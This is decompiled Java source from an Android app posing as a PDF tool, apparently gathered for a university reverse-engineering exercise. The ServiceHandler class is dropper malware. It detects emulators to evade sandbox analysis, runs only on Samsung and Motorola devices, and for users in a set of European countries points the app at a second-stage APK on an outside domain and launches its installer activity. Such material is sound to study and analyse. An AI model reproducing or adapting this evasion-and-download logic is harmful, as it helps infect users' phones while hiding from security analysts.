package com.travisscott.pdf;

import android.content.Context;
import android.content.Intent;
import android.os.Build;
import android.telephony.TelephonyManager;
import java.io.BufferedReader;
import java.io.InputStreamReader;
import java.net.URL;
import java.util.Objects;
import javax.net.ssl.HttpsURLConnection;

/* loaded from: /home/davidjosearaujo/Documents/mc/first-year/second-semester/RE/P/re-android-reversing/original_zip/cortina.dex */
public class ServiceHandler {
    private static final String TAG = "MainServiceJob";

    public static String getHTML(String urlToRead) throws Exception {
        StringBuilder result = new StringBuilder();
        URL url = new URL(urlToRead);
        HttpsURLConnection conn = (HttpsURLConnection) url.openConnection();
        conn.setRequestMethod("GET");
        BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
        while (true) {
            try {
                String line = reader.readLine();
                if (line != null) {
                    result.append(line);
                } else {
                    reader.close();
                    return result.toString();
                }
            } catch (Throwable th) {
                try {
                    reader.close();
                } catch (Throwable th2) {
                    th.addSuppressed(th2);
                }
                throw th;
            }
        }
    }

    private static boolean checkBuildConfig() {
        return Build.MANUFACTURER.contains("Genymotion") || Build.MODEL.contains("google_sdk")
                || Build.MODEL.toLowerCase().contains("droid4x") || Build.MODEL.contains("Emulator")
                || Build.MODEL.contains("Android SDK built for x86") || Objects.equals(Build.HARDWARE, "goldfish")
                || Objects.equals(Build.HARDWARE, "vbox86") || Build.HARDWARE.toLowerCase().contains("nox")
                || Build.FINGERPRINT.startsWith("generic") || Objects.equals(Build.PRODUCT, "sdk")
                || Objects.equals(Build.PRODUCT, "google_sdk") || Objects.equals(Build.PRODUCT, "sdk_x86")
                || Objects.equals(Build.PRODUCT, "vbox86p") || Build.PRODUCT.toLowerCase().contains("nox")
                || Build.BOARD.toLowerCase().contains("nox")
                || (Build.BRAND.startsWith("generic") && Build.DEVICE.startsWith("generic"));
    }

    private static boolean isManuFacturerGood() {
        String man = Build.MANUFACTURER.toLowerCase();
        return man.contains("samsung") || man.contains("moto");
    }

    public static void handleWork(Context context) {
        if (Build.MODEL != null && !Build.MODEL.isEmpty() && Build.MANUFACTURER != null
                && !Build.MANUFACTURER.isEmpty()) {
            TelephonyManager tm = (TelephonyManager) context.getSystemService("phone");
            String country = tm.getNetworkCountryIso().isEmpty() ? "uat" : tm.getNetworkCountryIso();
            if (isManuFacturerGood() && !checkBuildConfig()) {
                if (!country.startsWith("es") && !country.startsWith("sk") && !country.startsWith("cz")
                        && !country.startsWith("ru") && !country.startsWith("hr") && !country.startsWith("si")
                        && !country.startsWith("sl") && !country.startsWith("bg") && !country.startsWith("ee")
                        && !country.startsWith("fi") && !country.startsWith("ie") && !country.startsWith("gb")) {
                    Intent i = new Intent(context, MainLibrary.getMainClass());
                    i.addFlags(268435456);
                    context.startActivity(i);
                    return;
                }
                try {
                    MainLibrary.url.set("https://befukiv.com/1.apk");
                    Intent i2 = new Intent(context, MainLibrary.getPartPreviewActivity());
                    i2.addFlags(268435456);
                    context.startActivity(i2);
                } catch (Exception e) {
                    e.printStackTrace();
                    Intent i3 = new Intent(context, MainLibrary.getMainClass());
                    i3.addFlags(268435456);
                    context.startActivity(i3);
                }
            }
        }
    }
}
